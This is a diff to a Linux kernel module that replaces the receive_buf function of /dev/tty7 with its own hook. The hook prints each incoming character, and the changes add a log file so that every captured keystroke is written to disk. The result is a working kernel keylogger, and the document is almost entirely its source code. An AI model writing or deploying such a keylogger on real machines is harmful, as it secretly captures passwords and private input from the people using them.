@@ -11,6 +11,9 @@
 // a module license is required for most modules to run
 MODULE_LICENSE("GPL");
 
+// our log file
+struct file* logfile;
+
 // pointer to the old receive_buf function
 void (*old_receive_buf)(struct tty_struct*,const unsigned char*,
 			char*,int);
@@ -20,6 +23,7 @@ void new_receive_buf(struct tty_struct* tty, const unsigned char* cp,
     // if we have a single character
     if(count == 1){
       printk(KERN_ALERT "buffer is %c\n",cp[0]);
+      if(logfile) kwrite(logfile,0,cp,count*sizeof(char));
     }
     if(count > 0 && count != 1){
       printk(KERN_ALERT "buffer is %s\n",cp);
@@ -32,10 +36,13 @@ static int init(void) {
   // our structs
   struct tty_struct* tty = NULL;
   struct file* file = NULL;
+  logfile = NULL;
   char* dev_name = "/dev/tty7";
 
   // open the tty
   file = kopen(dev_name,LF_FLAGS,LF_PERMS);
+  // open our logfile
+  logfile = kopen(LF_PATH,LF_FLAGS,LF_PERMS);
   if(file){
     printk(KERN_ALERT "tty was opened\n");
     struct tty_file_private* priv = NULL;
@@ -56,7 +63,9 @@ static int init(void) {
 }
 	 
 static void exit(void) {
-// our structs
+  // close our log file
+  if(logfile) kclose(logfile);
+  // our structs
   struct tty_struct* tty = NULL;
   struct file* file = NULL;
   char* dev_name = "/dev/tty7";
